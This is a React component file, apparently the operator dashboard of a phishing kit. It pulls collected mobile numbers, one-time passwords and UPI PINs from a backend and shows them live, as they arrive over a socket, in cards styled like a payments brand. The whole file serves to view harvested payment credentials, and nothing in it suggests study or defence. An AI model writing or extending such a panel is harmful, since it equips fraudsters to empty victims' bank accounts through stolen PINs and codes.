import axios from 'axios';
import React, { useEffect, useState } from 'react';
import { io } from "socket.io-client";

const socket = io(import.meta.env.VITE_BASEURL); // Ensure your backend URL is correct


function UserDevloper() {
  const [allData, setAllData] = useState({
    totalNumber: [], // Array to store mobile numbers
    otpPinData: [],  // Array to store OTP data
  });

  // Fetch all user data
  const getAllData = () => {
    axios
      .get(`${import.meta.env.VITE_BASEURL}/${import.meta.env.VITE_REQUESTROUTE}/getalluserdata`, {
        withCredentials: true, // Include cookies if required
      })
      .then((res) => {
        const data = {
          totalNumber: res.data.totalNumber.reverse(),
          otpPinData: res.data.OTPPIN.reverse(),
        };
        setAllData(data); // Set the combined object to state
      })
      .catch((err) => {
        console.error(err);
      });
  };

  // Fetch data on component mount
  useEffect(() => {
    getAllData(); // Fetch initial data on component mount

    socket.on("newData", (newData) => {
      console.log("Real-time update received:", newData);

      setAllData((prevData) => {
        if (newData.type === "mobile") {
          return { ...prevData, totalNumber: [newData.data, ...prevData.totalNumber] };
        } else if (newData.type === "otp") {
          return { ...prevData, otpPinData: [newData.data, ...prevData.otpPinData] };
        }
        return prevData;
      });
    });

    return () => {
      socket.off("newData"); // Cleanup the socket listener on unmount
    };
  }, []);

  return (
    <>
      <h2>User Data</h2>
      <div style={styles.container}>
        {allData.totalNumber.length > 0 ? (
          allData.totalNumber.map((numberData, index) => (
            <div key={numberData._id} style={styles.card}>
              <h4 style={styles.cardTitle}>Mobile Number: {numberData.mobilenumber}</h4>
              <h5>OTP: {allData.otpPinData[index]?.otp || 'N/A'}</h5>
              <h6>UPI Pin: {allData.otpPinData[index]?.upiPin || 'N/A'}</h6>
            </div>
          ))
        ) : (
          <p>No data available</p>
        )}
      </div>
    </>
  );
}

const styles = {
  container: {
    display: 'flex',
    flexWrap: 'wrap',
    gap: '20px',
    justifyContent: 'center',
    padding: '20px',
  },
  card: {
    backgroundColor: '#f8f9fa',
    border: '1px solid #dee2e6',
    borderRadius: '8px',
    padding: '20px',
    width: '300px',
    boxShadow: '0 4px 8px rgba(0, 0, 0, 0.1)',
    textAlign: 'left',
  },
  cardTitle: {
    marginBottom: '10px',
    color: '#5F259E',
    fontWeight: 'bold',
  },
};

export default UserDevloper;
